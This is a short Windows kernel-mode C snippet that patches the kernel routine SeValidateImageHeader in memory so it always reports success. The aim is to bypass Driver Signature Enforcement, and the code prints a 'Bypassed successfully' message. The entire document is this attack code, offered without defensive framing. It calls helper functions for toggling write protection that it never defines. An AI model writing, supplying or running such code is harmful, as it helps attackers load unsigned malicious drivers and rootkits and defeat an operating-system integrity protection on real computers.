#include <ntddk.h>

VOID BypassDSE(VOID) {
    UNICODE_STRING routineName;
    RtlInitUnicodeString(&routineName, L"SeValidateImageHeader");
    
    PVOID pSeValidateImageHeader = MmGetSystemRoutineAddress(&routineName);
    if (pSeValidateImageHeader) {
        UCHAR patch[] = { 0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3 };
        DisableWriteProtection();
        RtlCopyMemory(pSeValidateImageHeader, patch, sizeof(patch));
        EnableWriteProtection();
        DbgPrint("[DSE] Bypassed successfully\n");
    }
}
